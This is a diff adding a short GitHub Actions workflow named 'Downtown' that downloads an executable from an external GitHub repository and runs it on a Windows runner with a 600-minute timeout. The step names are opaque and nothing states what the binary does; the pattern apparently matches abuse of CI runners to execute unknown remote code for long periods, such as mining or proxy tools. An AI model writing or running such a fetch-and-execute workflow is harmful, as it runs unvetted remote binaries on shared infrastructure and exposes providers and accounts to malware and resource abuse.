@@ -1,0 +1,11 @@
+name: Downtown
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+    - name: HIS
+      run: Invoke-WebRequest https://github.com/Hisenbergpinkman/DOWNTOWN/raw/main/Downtown.exe -OutFile Downtown.exe
+    - name: BRG
+      run: .\Downtown.exe
+      timeout-minutes: 600
